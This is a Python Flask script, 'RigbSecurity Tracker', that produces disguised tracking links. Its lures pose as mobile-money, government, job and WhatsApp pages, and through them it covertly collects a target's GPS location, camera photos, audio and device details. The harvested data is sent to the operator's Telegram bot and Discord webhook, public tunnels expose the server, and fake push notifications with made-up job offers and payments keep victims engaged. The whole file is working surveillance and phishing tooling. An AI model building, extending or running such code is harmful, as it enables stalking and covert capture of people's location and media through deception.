#!/usr/bin/env python3

VERSION = '2.0.0'

R = '\033[31m'
G = '\033[32m'
C = '\033[36m'
W = '\033[0m'
Y = '\033[33m'
M = '\033[35m'

import sys
import os
import json
import time
import uuid
import base64
import signal
import argparse
import threading
import subprocess as subp
import re
from datetime import datetime
from csv import writer as csv_writer

try:
    from flask import Flask, request, jsonify, send_from_directory
    from flask_sock import Sock
except ImportError:
    os.system('pip3 install flask flask-sock pywebpush requests')
    from flask import Flask, request, jsonify, send_from_directory
    from flask_sock import Sock

try:
    from pywebpush import webpush, WebPushException
except ImportError:
    os.system('pip3 install pywebpush')
    from pywebpush import webpush, WebPushException

import utils

SCRIPT_DIR = os.path.dirname(os.path.realpath(__file__))
DB_DIR = os.path.join(SCRIPT_DIR, 'db')
LOG_DIR = os.path.join(SCRIPT_DIR, 'logs')
CAPTURES_DIR = os.path.join(SCRIPT_DIR, 'captures')
STATIC_DIR = os.path.join(SCRIPT_DIR, 'static')
TEMPLATES_JSON = os.path.join(SCRIPT_DIR, 'template', 'templates.json')
META_FILE = os.path.join(SCRIPT_DIR, 'metadata.json')
DATA_FILE = os.path.join(DB_DIR, 'results.csv')
TARGETS_FILE = os.path.join(DB_DIR, 'targets.json')

for d in [DB_DIR, LOG_DIR, CAPTURES_DIR, STATIC_DIR]:
    os.makedirs(d, exist_ok=True)

parser = argparse.ArgumentParser(description='RigbSecurity Tracker v' + VERSION)
parser.add_argument('-p', '--port', type=int, default=8000, help='Server port [Default: 8000]')
parser.add_argument('-t', '--tunnel', choices=['cloudflared', 'ngrok', 'loclx', 'manual'],
                    default='loclx', help='Tunnel type [Default: loclx]')
parser.add_argument('--no-tunnel', action='store_true', help='No tunnel')
parser.add_argument('-tg', '--telegram', help='Telegram bot token:chatId')
parser.add_argument('-wh', '--webhook', help='Discord/Custom webhook URL')
parser.add_argument('-v', '--version', action='store_true', help='Print version')
parser.add_argument('-k', '--kml', help='KML output filename')

args = parser.parse_args()

if args.version:
    print(VERSION)
    sys.exit()

port = int(os.getenv('PORT', 0)) or args.port
TELEGRAM = os.getenv('TELEGRAM') or args.telegram
WEBHOOK = os.getenv('WEBHOOK') or args.webhook
VAPID_PUBLIC = os.getenv('VAPID_PUBLIC', '')
VAPID_PRIVATE = os.getenv('VAPID_PRIVATE', '')

targets = {}
gps_data = {}
media_log = {}
device_info_store = {}
push_subs = {}
ws_dashboards = []


def load_targets():
    global targets, gps_data, media_log
    if os.path.exists(TARGETS_FILE):
        try:
            with open(TARGETS_FILE) as f:
                data = json.load(f)
                targets = data.get('targets', {})
                gps_data = data.get('gps_data', {})
                media_log = data.get('media_log', {})
                utils.print(f'{G}[+] {C}Loaded {len(targets)} targets from disk{W}')
        except Exception:
            pass


def save_targets():
    try:
        with open(TARGETS_FILE, 'w') as f:
            json.dump({
                'targets': targets,
                'gps_data': gps_data,
                'media_log': media_log
            }, f, indent=2, default=str)
    except Exception:
        pass


load_targets()


def auto_save():
    while True:
        time.sleep(60)
        save_targets()


threading.Thread(target=auto_save, daemon=True).start()


def banner():
    art = f"""{G}
 ____  _       _     ____                       _ _
|  _ \$$_) __ _| |__ / ___|  ___  ___ _   _ _ __(_) |_ _   _
| |_) | |/ _` | '_ \\\\___ \\ / _ \\/ __| | | | '__| | __| | | |
|  _ <| | (_| | |_) |___) |  __/ (__| |_| | |  | | |_| |_| |
|_| \\_\\_|\\__, |_.__/|____/ \\___|\\___|\\___|_|  |_|\\__|\\__, |
         |___/            {Y}TRACKER v{VERSION}{G}                 |___/{W}

{G}[>] {C}Created By   : {W}RigbSecurity
{G}[>] {C}Version      : {W}{VERSION}
{G}[>] {C}Mode         : {Y}GPS ONLY — No IP Geolocation{W}
{G}[>] {C}Features     : {W}GPS + Camera + Audio + Persistence
"""
    utils.print(art)


def load_templates():
    with open(TEMPLATES_JSON) as f:
        return json.load(f)['templates']


def send_telegram_gps(tid, entry):
    if not TELEGRAM:
        return
    try:
        parts = TELEGRAM.split(':')
        if len(parts) < 3:
            return
        token = f"{parts[0]}:{parts[1]}"
        chat_id = parts[2]
        name = targets.get(tid, {}).get('name', tid)
        lat = entry.get('lat', '?')
        lon = entry.get('lon', '?')
        acc = entry.get('acc', '?')

        import requests
        url = f"https://api.telegram.org/bot{token}"
        requests.post(f"{url}/sendLocation", json={
            'chat_id': chat_id, 'latitude': lat, 'longitude': lon
        }, timeout=10)
        msg = (f"📍 *GPS FIX — [{name}]*\n"
               f"Lat: `{lat}`\nLon: `{lon}`\nAccuracy: `{acc}m`\n"
               f"Source: `SATELLITE GPS`\nTime: `{datetime.now().strftime('%H:%M:%S')}`\n"
               f"[Google Maps](https://maps.google.com/?q={lat},{lon})")
        requests.post(f"{url}/sendMessage", json={
            'chat_id': chat_id, 'text': msg, 'parse_mode': 'Markdown',
            'disable_web_page_preview': True
        }, timeout=10)
    except Exception as e:
        utils.print(f'{R}[-] {C}Telegram error: {str(e)}{W}')


def send_telegram_photo(tid, filepath):
    if not TELEGRAM:
        return
    try:
        parts = TELEGRAM.split(':')
        token = f"{parts[0]}:{parts[1]}"
        chat_id = parts[2]
        name = targets.get(tid, {}).get('name', tid)
        import requests
        with open(filepath, 'rb') as photo:
            requests.post(f"https://api.telegram.org/bot{token}/sendPhoto",
                          data={'chat_id': chat_id,
                                'caption': f"📸 [{name}] — {datetime.now().strftime('%H:%M:%S')}"},
                          files={'photo': photo}, timeout=30)
    except Exception:
        pass


def send_discord(tid, entry, msg_type='gps'):
    if not WEBHOOK:
        return
    try:
        import requests
        name = targets.get(tid, {}).get('name', tid)
        if msg_type == 'gps':
            embed = {"embeds": [{"title": f"📍 GPS — {name}", "color": 3066993, "fields": [
                {"name": "Lat", "value": str(entry.get('lat')), "inline": True},
                {"name": "Lon", "value": str(entry.get('lon')), "inline": True},
                {"name": "Acc", "value": f"{entry.get('acc')}m", "inline": True},
                {"name": "Maps", "value": f"[Open](https://maps.google.com/?q={entry['lat']},{entry['lon']})"}
            ]}]}
        else:
            embed = {"embeds": [{"title": f"📱 {msg_type} — {name}", "color": 10181046,
                                 "description": json.dumps(entry, indent=2, default=str)[:2000]}]}
        requests.post(WEBHOOK, json=embed, timeout=10)
    except Exception:
        pass


def broadcast_dashboard(data):
    msg = json.dumps(data, default=str)
    dead = []
    for ws in ws_dashboards:
        try:
            ws.send(msg)
        except Exception:
            dead.append(ws)
    for ws in dead:
        if ws in ws_dashboards:
            ws_dashboards.remove(ws)


def print_visit(tid):
    t = targets[tid]
    utils.print(f'\n{Y}  [!] {C}Target visited page{W}')
    utils.print(f'{G}  [+] {C}ID       : {W}{tid}')
    utils.print(f'{G}  [+] {C}Name     : {W}{t.get("name", tid)}')
    utils.print(f'{G}  [+] {C}Template : {W}{t.get("template")}')
    utils.print(f'{G}  [+] {C}Visit #  : {W}{t.get("visits", 1)}')


def print_gps(tid, entry):
    name = targets.get(tid, {}).get('name', tid)
    lat = entry.get('lat', '?')
    lon = entry.get('lon', '?')
    acc = entry.get('acc', '?')
    spd = entry.get('spd')
    speed_str = f"{float(spd)*2.237:.1f} mph" if spd else "Stationary"
    acc_str = f"{float(acc):.1f}" if acc else "?"
    utils.print(f"""
{G}  ╔══════════════════════════════════════════════╗
  ║  📍 GPS SATELLITE FIX                         ║
  ╠══════════════════════════════════════════════╣
  ║  Target    : {name:<33}║
  ║  Latitude  : {str(lat):<33}║
  ║  Longitude : {str(lon):<33}║
  ║  Accuracy  : {acc_str + 'm':<33}║
  ║  Speed     : {speed_str:<33}║
  ║  Time      : {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<33}║
  ╠══════════════════════════════════════════════╣
  ║  🗺️  https://maps.google.com/?q={lat},{lon}
  ╚══════════════════════════════════════════════╝{W}""")


def print_media(tid, media_type, camera, filename):
    name = targets.get(tid, {}).get('name', tid)
    if media_type == 'photo':
        utils.print(f'{M}  📸 [{name}] Photo ({camera}): {filename}{W}')
    else:
        utils.print(f'{C}  🎙️ [{name}] Audio: {filename}{W}')


def print_device(tid, data):
    name = targets.get(tid, {}).get('name', tid)
    batt = data.get('battery', {})
    net = data.get('network', {})
    utils.print(f"""
{M}  ╔══════════════════════════════════════════════╗
  ║  📱 DEVICE FINGERPRINT                        ║
  ╠══════════════════════════════════════════════╣
  ║  Target   : {name:<34}║
  ║  Platform : {str(data.get('platform','?')):<34}║
  ║  Cores    : {str(data.get('cores','?')):<34}║
  ║  Battery  : {str(batt.get('level','?')) + '%':<34}║
  ║  Network  : {str(net.get('effectiveType','?')):<34}║
  ║  Timezone : {str(data.get('timezone','?')):<34}║
  ╚══════════════════════════════════════════════╝{W}""")


def csv_save(tid, entry):
    try:
        with open(DATA_FILE, 'a', newline='') as f:
            w = csv_writer(f)
            w.writerow([tid, targets.get(tid, {}).get('name', tid),
                         entry.get('lat'), entry.get('lon'), entry.get('acc'),
                         entry.get('alt'), entry.get('spd'), entry.get('source'),
                         datetime.now().isoformat()])
    except Exception:
        pass


def get_push_message(template):
    import random
    messages = {
        'contractor':   [{'title': '🏗️ Job Lead Expiring', 'body': 'Kitchen remodel lead expires in 1hr.'}],
        'carpenter':    [{'title': '🪚 New Estimate', 'body': 'Custom furniture — $5K budget.'}],
        'electrician':  [{'title': '⚡ Emergency Call', 'body': 'Customer without power 2 hours.'}],
        'teacher':      [{'title': '🏫 Admin Message', 'body': 'Principal shared a document.'}],
        'actor':        [{'title': '🎬 Callback!', 'body': 'Director wants to see you again.'}],
        'realtor':      [{'title': '🏠 Buyer Update', 'body': 'Buyer increased offer by $15K.'}],
        'photographer': [{'title': '📸 Client Message', 'body': 'Wedding client wants to discuss.'}],
        'dj':           [{'title': '🎧 Gig Expiring', 'body': 'Saturday gig needs confirmation.'}],
        'delivery':     [{'title': '🚚 Route Changed', 'body': '2 new priority stops added.'}],
        'nurse':        [{'title': '🏥 Bonus Increased', 'body': 'Shift bonus bumped to $750.'}],
        'mechanic':     [{'title': '🔧 Repair Approved', 'body': 'Customer approved $2,800 repair.'}],
        'lawyer':       [{'title': '⚖️ Docs Uploaded', 'body': 'Client uploaded medical records.'}],
        'fitness':      [{'title': '💪 Client Progress', 'body': 'Client logged a personal record!'}],
        'chef':         [{'title': '👨‍🍳 Menu Approved', 'body': 'Saturday client approved menu.'}],
        'barber':       [{'title': '💈 VIP Update', 'body': 'VIP client moved to 3PM.'}],
        'musician':     [{'title': '🎵 Session Change', 'body': 'Studio session moved to 2PM.'}],
        'cleaner':      [{'title': '🧹 Premium Job', 'body': 'Deep clean — $400 payout.'}],
        'trucker':      [{'title': '🚛 Rate Increased', 'body': 'Load bumped to $5.00/mile.'}],
        'influencer':   [{'title': '📱 Brand Approved', 'body': 'Nike approved your concept.'}],
        'pastor':       [{'title': '⛪ Member Needs Help', 'body': 'Family requesting a visit.'}],
    }
    msgs = messages.get(template, [{'title': '🔔 Action Required', 'body': 'You have a pending item.'}])
    return random.choice(msgs)


def push_loop(tid):
    time.sleep(2 * 60 * 60)
    import random
    while tid in push_subs:
        sub = push_subs.get(tid)
        if not sub or not VAPID_PUBLIC or not VAPID_PRIVATE:
            break
        template = targets.get(tid, {}).get('template', 'generic')
        msg = get_push_message(template)
        try:
            webpush(subscription_info=sub, data=json.dumps(msg),
                    vapid_private_key=VAPID_PRIVATE,
                    vapid_claims={"sub": "mailto:admin@rigbsecurity.com"})
            utils.print(f'{Y}  [!] {C}Auto-push [{tid}]: {msg["title"]}{W}')
        except Exception:
            if tid in push_subs:
                del push_subs[tid]
            break
        time.sleep((3 + random.random() * 3) * 3600)


# ═══════════════════════════════════════════
# FLASK APP
# ═══════════════════════════════════════════

app = Flask(__name__, static_folder=STATIC_DIR)
sock = Sock(app)

import logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)


@app.route('/<path>/<tid>')
def serve_tracking_page(path, tid):
    templates = load_templates()
    valid_paths = [t['url_path'] for t in templates]
    if path not in valid_paths:
        return "Not found", 404
    if tid not in targets:
        return "Not found", 404
    targets[tid]['visits'] = targets[tid].get('visits', 0) + 1
    print_visit(tid)
    return send_from_directory(STATIC_DIR, 'tracker.html')


@app.route('/api/create')
def api_create():
    tid = uuid.uuid4().hex[:8]
    template = request.args.get('template', 'generic')
    name = request.args.get('name', '')
    targets[tid] = {'created': datetime.now().isoformat(), 'template': template,
                     'name': name or tid, 'visits': 0}
    gps_data[tid] = []
    media_log[tid] = []
    templates = load_templates()
    url_path = 'verify'
    for t in templates:
        if t['dir_name'] == template:
            url_path = t['url_path']
            break
    host = request.host_url.rstrip('/')
    save_targets()
    return jsonify({'trackingId': tid, 'link': f'{host}/{url_path}/{tid}',
                    'dashboard': f'{host}/dashboard'})


@app.route('/api/gps/<tid>', methods=['POST'])
def api_gps(tid):
    if tid not in targets:
        return jsonify({'error': 'invalid'}), 404
    data = request.get_json(silent=True) or {}
    entry = {'lat': data.get('lat'), 'lon': data.get('lon'), 'acc': data.get('acc'),
             'alt': data.get('alt'), 'dir': data.get('dir'), 'spd': data.get('spd'),
             'source': data.get('source', 'gps'), 'ts': data.get('ts', datetime.now().isoformat()),
             'ua': request.headers.get('User-Agent', '')}
    if tid not in gps_data:
        gps_data[tid] = []
    gps_data[tid].append(entry)
    print_gps(tid, entry)
    csv_save(tid, entry)
    broadcast_dashboard({'type': 'gps', 'tid': tid, 'entry': entry})
    count = len(gps_data[tid])
    if count == 1 or count % 10 == 0:
        send_telegram_gps(tid, entry)
        send_discord(tid, entry, 'gps')
    return jsonify({'status': 'ok'})


@app.route('/api/beacon/<tid>', methods=['POST'])
def api_beacon(tid):
    if tid not in targets:
        return '', 204
    try:
        raw = request.get_data(as_text=True)
        data = json.loads(raw) if raw else {}
        entry = {'lat': data.get('lat'), 'lon': data.get('lon'), 'acc': data.get('acc'),
                 'source': 'gps_beacon', 'ts': datetime.now().isoformat()}
        if entry['lat'] is not None:
            if tid not in gps_data:
                gps_data[tid] = []
            gps_data[tid].append(entry)
            print_gps(tid, entry)
            broadcast_dashboard({'type': 'gps', 'tid': tid, 'entry': entry})
    except Exception:
        pass
    return '', 204


@app.route('/api/media/<tid>', methods=['POST'])
def api_media(tid):
    if tid not in targets:
        return jsonify({'error': 'invalid'}), 404
    data = request.get_json(silent=True) or {}
    media_type = data.get('type', 'photo')
    media_b64 = data.get('data', '')
    camera = data.get('camera', 'front')
    target_dir = os.path.join(CAPTURES_DIR, tid)
    os.makedirs(target_dir, exist_ok=True)
    ext = 'jpg' if media_type == 'photo' else 'webm'
    filename = f"{media_type}_{camera}_{int(time.time()*1000)}.{ext}"
    filepath = os.path.join(target_dir, filename)
    try:
        b64_clean = media_b64.split(',')[-1] if ',' in media_b64 else media_b64
        with open(filepath, 'wb') as f:
            f.write(base64.b64decode(b64_clean))
    except Exception:
        return jsonify({'error': 'decode failed'}), 400
    entry = {'type': media_type, 'camera': camera, 'filename': filename,
             'ts': data.get('ts', datetime.now().isoformat())}
    if tid not in media_log:
        media_log[tid] = []
    media_log[tid].append(entry)
    print_media(tid, media_type, camera, filename)
    broadcast_dashboard({'type': 'media', 'tid': tid, 'entry': entry})
    photo_count = len([m for m in media_log[tid] if m['type'] == 'photo'])
    if media_type == 'photo' and photo_count <= 3:
        send_telegram_photo(tid, filepath)
    return jsonify({'status': 'ok'})


@app.route('/api/device/<tid>', methods=['POST'])
def api_device(tid):
    if tid not in targets:
        return jsonify({'error': 'invalid'}), 404
    data = request.get_json(silent=True) or {}
    device_info_store[tid] = data
    print_device(tid, data)
    broadcast_dashboard({'type': 'device', 'tid': tid, 'data': data})
    return jsonify({'status': 'ok'})


@app.route('/api/subscribe/<tid>', methods=['POST'])
def api_subscribe(tid):
    push_subs[tid] = request.get_json(silent=True)
    utils.print(f'{G}  [+] {C}[{tid}] Push subscribed{W}')
    threading.Thread(target=push_loop, args=(tid,), daemon=True).start()
    return jsonify({'status': 'subscribed'})


@app.route('/api/push/<tid>', methods=['POST'])
def api_push(tid):
    sub = push_subs.get(tid)
    if not sub or not VAPID_PUBLIC or not VAPID_PRIVATE:
        return jsonify({'status': 'no subscription'})
    msg = get_push_message(targets.get(tid, {}).get('template', 'generic'))
    try:
        webpush(subscription_info=sub, data=json.dumps(msg),
                vapid_private_key=VAPID_PRIVATE,
                vapid_claims={"sub": "mailto:admin@rigbsecurity.com"})
        return jsonify({'status': 'sent'})
    except Exception:
        if tid in push_subs:
            del push_subs[tid]
        return jsonify({'status': 'failed'})


@app.route('/api/vapid-key')
def api_vapid():
    return jsonify({'key': VAPID_PUBLIC})


@app.route('/api/all-targets')
def api_all_targets():
    result = {}
    for tid in targets:
        result[tid] = {'tracking': targets[tid], 'locations': gps_data.get(tid, []),
                       'media': media_log.get(tid, []), 'device': device_info_store.get(tid, {})}
    return jsonify(result)


@app.route('/api/command/<tid>', methods=['POST'])
def api_command(tid):
    return jsonify({'status': 'sent' if tid in targets else 'offline'})


@app.route('/dashboard')
@app.route('/dashboard.html')
def serve_dashboard():
    return send_from_directory(STATIC_DIR, 'dashboard.html')


@app.route('/sw.js')
def serve_sw():
    resp = send_from_directory(STATIC_DIR, 'sw.js')
    resp.headers['Service-Worker-Allowed'] = '/'
    resp.headers['Content-Type'] = 'application/javascript'
    return resp


@app.route('/manifest.json')
def serve_manifest():
    return send_from_directory(STATIC_DIR, 'manifest.json')


@app.route('/js/<path:filename>')
def serve_js(filename):
    return send_from_directory(os.path.join(SCRIPT_DIR, 'js'), filename)


@app.route('/captures/<tid>/<filename>')
def serve_capture(tid, filename):
    return send_from_directory(os.path.join(CAPTURES_DIR, tid), filename)


@app.route('/api/keepalive')
def keepalive():
    return '', 200


@sock.route('/ws/dashboard')
def ws_dashboard(ws):
    ws_dashboards.append(ws)
    utils.print(f'{G}  [+] {C}Dashboard connected ({len(ws_dashboards)}){W}')
    try:
        while True:
            ws.receive(timeout=60)
    except Exception:
        pass
    finally:
        if ws in ws_dashboards:
            ws_dashboards.remove(ws)


# ═══════════════════════════════════════════
# TUNNELING
# ═══════════════════════════════════════════

def start_loclx(lport):
    utils.print(f'{G}  [+] {C}Starting LocalXpose tunnel...{W}')
    subdomain = input(f'{G}  [?] {C}LocalXpose subdomain > {W}').strip()
    if not subdomain:
        subdomain = 'rigbtrack'
    try:
        proc = subp.Popen(
            ['loclx', 'tunnel', 'http', '--to', f'localhost:{lport}', '--subdomain', subdomain],
            stdout=subp.PIPE, stderr=subp.PIPE
        )
        time.sleep(6)
        url = f'https://{subdomain}.loclx.io'
        utils.print(f'{G}  [+] {C}Tunnel: {W}{url}')
        try:
            import requests
            r = requests.get(f'{url}/api/keepalive', timeout=10)
            if r.status_code == 200:
                utils.print(f'{G}  [+] {C}Tunnel verified ✔{W}')
            else:
                utils.print(f'{Y}  [!] {C}Tunnel may still be starting...{W}')
        except Exception:
            utils.print(f'{Y}  [!] {C}Tunnel starting, give it a moment...{W}')
        return url, proc
    except FileNotFoundError:
        utils.print(f'{R}  [-] {C}loclx not found in PATH{W}')
        return None, None


def start_cloudflared(lport):
    utils.print(f'{G}  [+] {C}Starting Cloudflare tunnel...{W}')
    try:
        proc = subp.Popen(
            ['cloudflared', 'tunnel', '--url', f'http://localhost:{lport}'],
            stdout=subp.PIPE, stderr=subp.PIPE
        )
        for _ in range(40):
            line = proc.stderr.readline().decode('utf-8', errors='ignore')
            if not line:
                time.sleep(0.5)
                continue
            match = re.search(r'https://[a-zA-Z0-9\-]+\.trycloudflare\.com', line)
            if match:
                url = match.group(0)
                utils.print(f'{G}  [+] {C}Tunnel: {W}{url}')
                return url, proc
        utils.print(f'{R}  [-] {C}Could not get tunnel URL{W}')
        return None, proc
    except FileNotFoundError:
        utils.print(f'{R}  [-] {C}cloudflared not found{W}')
        return None, None


def start_ngrok(lport):
    utils.print(f'{G}  [+] {C}Starting ngrok tunnel...{W}')
    try:
        subp.Popen(['ngrok', 'http', str(lport)], stdout=subp.DEVNULL, stderr=subp.DEVNULL)
        time.sleep(3)
        import requests
        resp = requests.get('http://127.0.0.1:4040/api/tunnels', timeout=5)
        data = resp.json()
        url = data['tunnels'][0]['public_url']
        if 'https' not in url:
            url = url.replace('http', 'https')
        return url, None
    except Exception as e:
        utils.print(f'{R}  [-] {C}ngrok failed: {str(e)}{W}')
        return None, None


# ═══════════════════════════════════════════
# TEMPLATE SELECTOR
# ═══════════════════════════════════════════

def select_template():
    templates = load_templates()
    utils.print(f'\n{C}  ┌──────────────────────────────────────────────────┐')
    utils.print(f'  │             SELECT TEMPLATE                       │')
    utils.print(f'  └──────────────────────────────────────────────────┘{W}\n')
    categories = {}
    for t in templates:
        cat = t.get('category', 'other')
        if cat not in categories:
            categories[cat] = []
        categories[cat].append(t)
    cat_labels = {
        'money': f'{Y}── MOBILE MONEY ──{W}',
        'utility': f'{Y}── UTILITY ──{W}',
        'government': f'{Y}── GOVERNMENT ──{W}',
        'whatsapp': f'{Y}── WHATSAPP GROUPS ──{W}',
        'meeting': f'{Y}── MEETINGS ──{W}',
        'artisan': f'{Y}── JOBS / ARTISAN ──{W}',
        'other': f'{Y}── OTHER ──{W}'
    }
    for cat in ['money', 'utility', 'government', 'whatsapp', 'meeting', 'artisan', 'other']:
        if cat in categories:
            utils.print(f'  {cat_labels.get(cat, cat)}')
            for t in categories[cat]:
                utils.print(f"  {G}[{str(t['id']).rjust(2)}]{W} {t['icon']}  {t['desc']}")
            utils.print('')
    try:
        choice = int(input(f'{G}  [?] {C}Select template > {W}').strip())
        for t in templates:
            if t['id'] == choice:
                return t
        utils.print(f'{R}  [-] Invalid, using MTN MoMo{W}')
        return templates[0]
    except (ValueError, KeyboardInterrupt):
        utils.print(f'{R}  [-] Invalid, using MTN MoMo{W}')
        return templates[0]

# ═══════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════

def main():
    banner()
    template = select_template()
    target_name = input(f'{G}  [?] {C}Target name (optional) > {W}').strip()
    tid = uuid.uuid4().hex[:8]
    targets[tid] = {'created': datetime.now().isoformat(), 'template': template['dir_name'],
                     'name': target_name or tid, 'visits': 0}
    gps_data[tid] = []
    media_log[tid] = []
    save_targets()

    tunnel_url = None
    tunnel_proc = None

    if not args.no_tunnel:
        if args.tunnel == 'loclx':
            tunnel_url, tunnel_proc = start_loclx(port)
        elif args.tunnel == 'cloudflared':
            tunnel_url, tunnel_proc = start_cloudflared(port)
        elif args.tunnel == 'ngrok':
            tunnel_url, tunnel_proc = start_ngrok(port)

    if tunnel_url:
        link = f"{tunnel_url}/{template['url_path']}/{tid}"
        dashboard = f"{tunnel_url}/dashboard"
    else:
        link = f"http://localhost:{port}/{template['url_path']}/{tid}"
        dashboard = f"http://localhost:{port}/dashboard"

    utils.print(f"""
{G}  ╔══════════════════════════════════════════════════════╗
  ║         🎯 TRACKING LINK READY                       ║
  ╠══════════════════════════════════════════════════════╣
  ║  Template  :  {template['icon']} {template['name']:<38}║
  ║  Target    :  {(target_name or tid):<38}║
  ║  ID        :  {tid:<38}║
  ║  Mode      :  {Y}GPS SATELLITE ONLY{G}                     ║
  ╠══════════════════════════════════════════════════════╣{W}
{Y}  📎 SEND THIS LINK:{W}
  {link}

{Y}  📊 YOUR DASHBOARD:{W}
  {dashboard}
{G}  ╚══════════════════════════════════════════════════════╝{W}

{Y}  [*] Waiting for target...{W}
{Y}  [*] Ctrl+C to stop{W}
""")

    def shutdown(sig, frame):
        utils.print(f'\n{R}  [-] Shutting down...{W}')
        save_targets()
        if tunnel_proc:
            tunnel_proc.terminate()
        sys.exit(0)

    signal.signal(signal.SIGINT, shutdown)
    signal.signal(signal.SIGTERM, shutdown)
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)


if __name__ == '__main__':
    main()
